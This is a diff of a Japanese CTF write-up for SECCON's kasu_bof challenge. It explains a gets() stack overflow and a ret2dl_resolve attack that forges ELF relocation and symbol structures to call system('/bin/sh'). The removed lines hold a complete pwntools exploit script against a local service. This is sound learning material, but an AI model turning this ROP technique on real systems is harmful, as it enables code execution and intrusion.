@@ -6,9 +6,6 @@ summary: "本記事はSECCON CTF 2021のPwn問題kasu_bofのWriteupです。"
 author: "mc4nf"
 ---
 
-
-#+HUGO_BASE_DIR: ./
-
 ** 問題
 *** 問題文
 #+begin_example
@@ -45,13 +42,13 @@ mc4nf@mc4nf:~/ctf/seccon2021/pwn/kasu_bof$ checksec chall
     PIE:      No PIE (0x8048000)
 #+end_example
 - x86
-- SSP無効
+- SSP (Stack Smashing Protection) 無効
 - Partial RELRO
       
 ** 方針
 配布されたソースコード ( ~main.c~ )を見てみると、以下の特徴がある。
-- ~buf~ のサイズが ~0x80~ 
-- ~gets~ を使用しているため、 ~\n~ (0x0a) が入力されるまで ~buf~ に任意の文字を入力可能
+- ~char~ 型の配列 ~buf~ のサイズが ~0x80~ byte 
+- ~gets~ を使用しているため、 ~\n~ (0x0a) が入力されるまで配列 ~buf~ に任意の文字を入力可能
 
   
 このことから，配布されたプログラムには簡単なスタックバッファオーバフローの脆弱性があることがわかる．
@@ -75,7 +72,10 @@ mc4nf@mc4nf:~/ctf/seccon2021/pwn/kasu_bof$ checksec chall
    3. ~.plt~ の先頭にジャンプし、偽の構造体を元に ~system~ のアドレスを解決し、 ~system("/bin/sh")~ を実行
 
    そこで、以下では、pltセクションからアドレス解決の流れを説明し、如何にして偽の構造体を作成すればよいかについて説明する。
-      
+
+*** ~main~ から ~puts~ が呼び出されるまで
+    main から puts が呼びだされるまでの流れを説明
+    
 *** ~.plt~ セクションからアドレス解決の流れ
     ~.plt~ セクションから、 ~link_map~ 構造体を元にそれぞれのセクションのアドレスが特定され、それぞれのセクションに含まれる情報を参照することにより、ライブラリ関数のシンボルを解決する。
 
@@ -111,27 +111,25 @@ reloc_arg---+   reloc_arg + .rel.plt         |                                  
    ~link_map~ はELFファイルと実際にマッピングされたアドレスの差分や各セクションのアドレス，再配置情報を保持する構造体であり、ライブラリ関数のシンボルを解決する際に参照される。   
 
    ~plt~ にジャンプする前に、 ~link_map~ 構造体のアドレス（GOTの2番目のエントリ）とGOTのオフセット ( ~reloc_arg~ )がスタックに格納される。
-     - https://elixir.bootlin.com/glibc/latest/source/include/link.h#L86
+     - https://elixir.bootlin.com/glibc/glibc-2.36/source/include/link.h#L95
 	 #+begin_src c
-	   /* Structure describing a loaded shared object.  The `l_next' and `l_prev'
-	      members form a chain of all the shared objects loaded at startup.
-
-	      These data structures exist in space used by the run-time dynamic linker;
-	      modifying them may have disastrous results.
-
-	      This data structure might change in future, if necessary.  User-level
-	      programs must avoid defining objects of this type.  */
-
 	   struct link_map
-	     {
-	       /* These first few members are part of the protocol with the debugger.
-		  This is the same format used in SVR4.  */
+	   {
+	     /* These first few members are part of the protocol with the debugger.
+		This is the same format used in SVR4.  */
 
-	       ElfW(Addr) l_addr;		/* Difference between the address in the ELF
+	     ElfW(Addr) l_addr;		/* Difference between the address in the ELF
 					      file and the addresses in memory.  */
-	       char *l_name;		/* Absolute file name object was found in.  */
-	       ElfW(Dyn) *l_ld;		/* Dynamic section of the shared object.  */
-	       struct link_map *l_next, *l_prev; /* Chain of loaded objects.  */
+	     char *l_name;		/* Absolute file name object was found in.  */
+	     ElfW(Dyn) *l_ld;		/* Dynamic section of the shared object.  */
+	     struct link_map *l_next, *l_prev; /* Chain of loaded objects.  */
+	     ...
+
+	     ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM
+		      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];
+	     ...
+	   }
+
 	 #+end_src
 	 
      以下の例の場合， ~link_map~ 構造体のアドレス ~0x804c004~ と ~gets~ の ~reloc_arg~ ~0x0~ をスタックにプッシュしている。
@@ -180,11 +178,9 @@ reloc_arg---+   reloc_arg + .rel.plt         |                                  
   ~.dynamic~ セクションのアドレスは ~0x804bf14~ であるとわかる。
    
   ~.dynamic~ セクションは， ~ELF_Dyn~ 構造体のエントリを ~d_tag~ の種類の数保持しており、この中に ~.rel.plt~ や ~.dynsym~ , ~.dynstr~ などのアドレスが格納されている。
-    - ELF_Dyn 構造体
-      - https://elixir.bootlin.com/glibc/latest/source/elf/elf.h#L838
+    - ELF32_Dyn 構造体
+      - https://elixir.bootlin.com/glibc/glibc-2.36/source/elf/elf.h#L840
 	#+begin_src c
-	  /* Dynamic section entry.  */
-
 	  typedef struct
 	  {
 	    Elf32_Sword d_tag;			/* Dynamic entry type */
@@ -194,20 +190,10 @@ reloc_arg---+   reloc_arg + .rel.plt         |                                  
 		Elf32_Addr d_ptr;			/* Address value */
 	      } d_un;
 	  } Elf32_Dyn;
-
-	  typedef struct
-	  {
-	    Elf64_Sxword d_tag;			/* Dynamic entry type */
-	    union
-	      {
-		Elf64_Xword d_val;		/* Integer value */
-		Elf64_Addr d_ptr;			/* Address value */
-	      } d_un;
-	  } Elf64_Dyn;
 	#+end_src
 	 
     - d_tagの定義
-      - https://elixir.bootlin.com/glibc/latest/source/elf/elf.h#L860
+      - https://elixir.bootlin.com/glibc/glibc-2.36/source/elf/elf.h#L862
 	#+begin_src c
 	  /* Legal values for d_tag (dynamic entry type).  */
 	  ...
@@ -239,49 +225,15 @@ reloc_arg---+   reloc_arg + .rel.plt         |                                  
       #+end_src
        
 **** ~.rel.plt~ セクション
-  ~rel.plt~ セクションは， ~ELF_Rel~ 構造体の配列となっている。
-    - ELF_Rel 構造体
-      - https://elixir.bootlin.com/glibc/latest/source/elf/elf.h#L632
+  ~rel.plt~ セクションは， ~ELF32_Rel~ 構造体の配列となっている。
+    - ELF32_Rel 構造体
+      - https://elixir.bootlin.com/glibc/glibc-2.36/source/elf/elf.h#L634
 	#+begin_src c
-	  /* Relocation table entry without addend (in section of type SHT_REL).  */
-
 	  typedef struct
 	  {
 	    Elf32_Addr	r_offset;		/* Address */
 	    Elf32_Word	r_info;			/* Relocation type and symbol index */
 	  } Elf32_Rel;
-
-	  /* I have seen two different definitions of the Elf64_Rel and
-	     Elf64_Rela structures, so we'll leave them out until Novell (or
-	     whoever) gets their act together.  */
-	  /* The following, at least, is used on Sparc v9, MIPS, and Alpha.  */
-
-	  typedef struct
-	  {
-	    Elf64_Addr	r_offset;		/* Address */
-	    Elf64_Xword	r_info;			/* Relocation type and symbol index */
-	  } Elf64_Rel;
-
-	  /* Relocation table entry with addend (in section of type SHT_RELA).  */
-
-	  typedef struct
-	  {
-	    Elf32_Addr	r_offset;		/* Address */
-	    Elf32_Word	r_info;			/* Relocation type and symbol index */
-	    Elf32_Sword r_addend;		/* Addend */
-	  } Elf32_Rela;
-
-	  typedef struct
-	  {
-	    Elf64_Addr	r_offset;		/* Address */
-	    Elf64_Xword r_info;			/* Relocation type and symbol index */
-	    Elf64_Sxword r_addend;		/* Addend */
-	  } Elf64_Rela;
-
-	  /* RELR relocation table entry */
-
-	  typedef Elf32_Word	Elf32_Relr;
-	  typedef Elf64_Xword	Elf64_Relr;
       #+end_src
 
      ~.dynamic~ セクションから取得した ~.rel.plt~ のアドレス先をgdbでダンプしてみる。
@@ -320,12 +272,10 @@ reloc_arg---+   reloc_arg + .rel.plt         |                                  
       #+end_src
        
 **** ~.dynsym~ セクション
-    ~.dynsym~ セクションは， ~Elf_Sym~ 構造体の配列となっている。
-      - ELF_Sym 構造体
-	- https://elixir.bootlin.com/glibc/latest/source/elf/elf.h#L517
+    ~.dynsym~ セクションは， ~Elf32_Sym~ 構造体の配列となっている。
+      - ELF32_Sym 構造体
+	- https://elixir.bootlin.com/glibc/glibc-2.36/source/elf/elf.h#L519
 	  #+begin_src c
-	    /* Symbol table entry.  */
-
 	    typedef struct
 	    {
 	      Elf32_Word	st_name;		/* Symbol name (string tbl index) */
@@ -335,17 +285,7 @@ reloc_arg---+   reloc_arg + .rel.plt         |                                  
 	      unsigned char st_other;		/* Symbol visibility */
 	      Elf32_Section st_shndx;		/* Section index */
 	    } Elf32_Sym;
-
-	    typedef struct
-	    {
-	      Elf64_Word	st_name;		/* Symbol name (string tbl index) */
-	      unsigned char st_info;		/* Symbol type and binding */
-	      unsigned char st_other;		/* Symbol visibility */
-	      Elf64_Section st_shndx;		/* Section index */
-	      Elf64_Addr	st_value;		/* Symbol value */
-	      Elf64_Xword st_size;		/* Symbol size */
-	    } Elf64_Sym;
-           #+end_src
+          #+end_src
 	  - ~st_name~ は，実際にシンボルが置かれている ~.dynstr~ セクションのオフセット
     ~r_info~ からインデックスを計算し、 ~Elf32_Sym~ のアドレスを特定してみる。
     #+begin_src
@@ -458,7 +398,7 @@ reloc_arg---+   reloc_arg + .rel.plt         |                                  
     必要なbyte数だけalignしている．
 
     Solverを書くときは，事前に ~.bss~ のどのアドレスがどの構造体やシンボルに対応するか計算しておき，ROPで ~gets~ の引数として指定しておき，ROPチェインが発火後に，それぞれの構造体やシンボルを書き込んでいく．
-        #+begin_src python
+    #+begin_src python
       Elf32_Rel_addr = bss
 
       Elf32_Sym_addr = Elf32_Rel_addr + 0x10
@@ -511,163 +451,8 @@ reloc_arg---+   reloc_arg + .rel.plt         |                                  
      #+end_src
 
 *** Solver
-**** solve.py
-    #+begin_src python
-      from pwn import *
+    https://github.com/Team-Enu/writeup/tree/main/seccon-ctf-2022/kasu_bof
 
-      filename = './chall'
-      chall = ELF(filename)
-
-      # docker-compose up
-      conn = remote('localhost', 9001)
-      # conn = process(filename)
-
-      plt = chall.get_section_by_name('.plt').header.sh_addr
-      bss = chall.get_section_by_name('.bss').header.sh_addr
-      rel = chall.get_section_by_name('.rel.plt').header.sh_addr
-      dynsym = chall.get_section_by_name('.dynsym').header.sh_addr
-      dynstr = chall.get_section_by_name('.dynstr').header.sh_addr
-      gets_got = chall.got['gets']
-      gets_plt = chall.plt['gets']
-
-      # 0x08049022: pop ebx; ret;
-      pop_ret = 0x08049022
-
-      # .bss section
-      # |-----------+---------------------------+---------|
-      # | Elf32_Rel | r_offset                  | 8 byte  |
-      # |           | r_info                    |         |
-      # |-----------+---------------------------+---------|
-      # |           |                           | 8 byte  |
-      # |           |                           | (align) |
-      # |-----------+---------------------------+---------|
-      # | Elf32_Sym | st_name                   | 16 byte |
-      # |           | st_value                  |         |
-      # |           | st_size                   |         |
-      # |           | st_info st_other st_shndx |         |
-      # |-----------+---------------------------+---------|
-      # |           |                           | 4byte   |
-      # |-----------+---------------------------+---------|
-      # | symbol    | 'system'                  | 4byte   |
-      # |-----------+---------------------------+---------|
-      # |           |                           | 4byte   |
-      # |-----------+---------------------------+---------|
-      # | argment   | '/bin/sh'                 | 4byte   |
-      # |-----------+---------------------------+---------|
-      # |           |                           |         |
-
-      Elf32_Rel_addr = bss
-
-      Elf32_Sym_addr = Elf32_Rel_addr + 0x10
-
-      system_symbol_addr = Elf32_Sym_addr + 0x14
-
-      sh_symbol_addr = system_symbol_addr + 0x1c
-
-      # calc index of Elf32_Rel from .rel.plt
-      reloc_arg = Elf32_Rel_addr - rel
-
-      # padding
-      buf = b'A'*0x84                 # fill stack
-      buf += p32(0xdeadbeaf)         # saved_ebp
-
-      # gets(Elf32_Rel_addr)
-      buf += p32(gets_plt)           # main return addr
-      buf += p32(pop_ret)            # gets return addr
-      buf += p32(Elf32_Rel_addr)     # gets arg
-
-      # gets(Elf32_Sym_addr)
-      buf += p32(gets_plt)           # pop ret return addr
-      buf += p32(pop_ret)            # gets return addr
-      buf += p32(Elf32_Sym_addr)     # gets arg
-
-      # gets(system_symbol_addr)
-      buf += p32(gets_plt)           # pop ret return addr
-      buf += p32(pop_ret)            # gets return addr
-      buf += p32(system_symbol_addr) # gets arg
-
-      # gets(sh_symbol_addr)
-      buf += p32(gets_plt)           # pop ret return addr
-      buf += p32(pop_ret)            # gets return  addr
-      buf += p32(sh_symbol_addr)     # gets arg
-
-      # system('/bin/sh')
-      buf += p32(plt)                # pop ret return addr
-      buf += p32(reloc_arg)          # reloc arg
-      buf += p32(0xdeadbeef)         # padding
-      buf += p32(sh_symbol_addr)     # system arg
-
-      conn.sendline(buf)
-
-      # create Elf32_Rel
-      ###################################################################################
-      # typedef struct
-      # {
-      #     Elf32_Addr	r_offset;		/* Address */
-      #     Elf32_Word	r_info;			/* Relocation type and symbol index */
-      # } Elf32_Rel;
-      ###################################################################################
-      r_offset = gets_got
-      r_info   = ((Elf32_Sym_addr - dynsym)//0x10)<<8 | 7
-
-      # |-----------+---------------------------+---------|
-      # | Elf32_Rel | r_offset                  | 8 byte  |
-      # |           | r_info                    |         |
-      # |-----------+---------------------------+---------|
-      Elf32_Rel = p32(r_offset)
-      Elf32_Rel += p32(r_info)
-    
-      conn.sendline(Elf32_Rel)
-
-      # create Elf32_Sym
-      ###################################################################################
-      # typedef struct
-      # {
-      #     Elf32_Word	st_name;		/* Symbol name (string tbl index) */
-      #     Elf32_Addr	st_value;		/* Symbol value */
-      #     Elf32_Word	st_size;		/* Symbol size */
-      #     unsigned char st_info;		/* Symbol type and binding */
-      #     unsigned char st_other;		/* Symbol visibility */
-      #     Elf32_Section st_shndx;		/* Section index */
-      # } Elf32_Sym;
-      ###################################################################################
-      st_name = system_symbol_addr - dynstr
-      st_value = 0x0
-      st_size = 0x0
-      st_info = 0x12
-      st_other = 0x0
-      st_shndx = 0x0
-
-      # |-----------+---------------------------+---------|
-      # | Elf32_Sym | st_name                   | 16 byte |
-      # |           | st_value                  |         |
-      # |           | st_size                   |         |
-      # |           | st_info st_other st_shndx |         |
-      # |-----------+---------------------------+---------|
-      Elf32_Sym = p32(st_name)
-      Elf32_Sym += p32(st_value)
-      Elf32_Sym += p32(st_size)
-      Elf32_Sym += p8(st_info)
-      Elf32_Sym += p8(st_other)
-      Elf32_Sym += p16(st_shndx)
-
-      conn.sendline(Elf32_Sym)
-
-      # create system symbol
-      # |-----------+---------------------------+---------|
-      # | symbol    | 'system'                  | 4byte   |
-      # |-----------+---------------------------+---------|
-      conn.sendline(b'system')
-
-      # create sh symbol
-      # |-----------+---------------------------+---------|
-      # | argment   | '/bin/sh'                 | 4byte   |
-      # |-----------+---------------------------+---------|
-      conn.sendline(b'/bin/sh')
-
-      conn.interactive()
-    #+end_src
-    
 **** 実行結果
      #+begin_example
 mc4nf@mc4nf:~/ctf/seccon2021/pwn/kasu_bof$ python solve.py 
@@ -713,3 +498,12 @@ SECCON{jUst_4_s1mpL3_b0f_ch4ll3ng3}
 
 - gdbに構造体定義を読み込ませて使う - ももいろテクノロジー
   - https://inaz2.hatenablog.com/entry/2014/07/21/124857
+
+
+- ret2dl_resolve Sections 關係表
+  - https://hackmd.io/@LJP/BkJmAqXEI
+  - ELfのマクロについて
+
+
+created 2022/11/11\\
+updated 2022/11/25
